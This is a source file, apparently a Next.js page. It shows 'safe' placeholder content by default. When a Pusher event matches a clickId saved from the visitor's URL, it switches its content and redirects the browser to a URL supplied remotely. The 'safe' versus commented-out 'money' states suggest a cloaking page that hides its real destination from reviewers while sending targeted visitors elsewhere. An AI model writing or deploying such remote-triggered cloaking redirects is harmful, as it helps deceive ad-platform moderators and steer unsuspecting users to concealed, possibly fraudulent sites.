// import Head from "next/head";
import Image from "next/image";
import { useEffect, useState } from "react";
import Pusher from "pusher-js";
import { useRouter } from "next/router";
import styles from "../styles/Home.module.css";
import { Header1, Header2 } from "../blocks/header1";

export default function Home() {
    const router = useRouter();
    const [content, setContent] = useState("safe");
    // const [content, setContent] = useState("money");
    const [curl, setCurl] = useState(null);
    const [blocks, setBlocks] = useState([]);
    useEffect(() => {
        if (router.query.clickId) {
            localStorage.setItem("clickId", router.query.clickId);
        }
        console.log("clickId =", router.query);
    }, [router.query.clickId]);
    useEffect(async () => {
        const response = await fetch("/api/buildContent");
        const json = await response.json();
        setBlocks(json.siteContent);
    }, []);
    useEffect(() => {
        Pusher.logToConsole = true;

        var pusher = new Pusher("ff28efbd675796f2529b", {
            cluster: "eu",
        });

        var channel = pusher.subscribe("my-channel-1");
        channel.bind("my-event", function (data) {
            const clickId = localStorage.getItem("clickId");
            console.log("clickId == data.clickId", clickId, data.clickId);

            if (clickId === data.clickId) {
                setContent(data.content);
                setCurl(data.curl);
            }
        });
    }, []);
    console.log("blocks", blocks);
    if (content == "safe")
        return (
            <div
                className={styles.container}
                style={{
                    backgroundColor: "whitesmoke",
                    backgroundRepeat: "no-repeat",
                    backgroundPosition: "center",
                    backgroundSize: "cover",
                    // backgroundImage:
                    //     "url(https://manrule.ru/images/article/orig/2019/08/obzor-smeshnyh-muzhskih-prichesok-35.jpg)",
                }}
            >
                <div style={{ minHeight: 500, backgroundColor: "lightred" }}>
                    {blocks.map((el, index) => {
                        console.log("!!! BLOCKS");
                        if (el.blockType === "header1") return <Header1 hData={el} key={index} />;
                        if (el.blockType === "header2") return <Header2 hData={el} key={index} />;
                    })}
                </div>
                <main className={styles.main}>
                    <div>Safe content</div>
                    <div>{/* <button onClick={() => {}}>AddNewMessage</button> */}</div>
                </main>

                <footer className={styles.footer}>
                    <a
                        href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
                        target="_blank"
                        rel="noopener noreferrer"
                    >
                        Powered by{" "}
                        <span className={styles.logo}>
                            <Image src="/vercel.svg" alt="Vercel Logo" width={72} height={16} />
                        </span>
                    </a>
                </footer>
            </div>
        );
    else {
        if (curl) window.location = curl;
        else
            return (
                <div
                    className={styles.container}
                    style={{
                        backgroundColor: "whitesmoke",
                        backgroundRepeat: "no-repeat",
                        backgroundPosition: "center",
                        backgroundSize: "cover",
                        backgroundImage:
                            "url(https://manrule.ru/images/article/orig/2019/08/obzor-smeshnyh-muzhskih-prichesok-35.jpg)",
                    }}
                >
                    <main className={styles.main}>
                        <h1 style={{ color: "white", fontSize: 200 }}>It is also safe</h1>
                        <div>{/* <button onClick={() => {}}>AddNewMessage</button> */}</div>
                    </main>

                    <footer className={styles.footer}>
                        <a
                            href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
                            target="_blank"
                            rel="noopener noreferrer"
                        >
                            Powered by{" "}
                            <span className={styles.logo}>
                                <Image src="/vercel.svg" alt="Vercel Logo" width={72} height={16} />
                            </span>
                        </a>
                    </footer>
                </div>
            );
    }
}
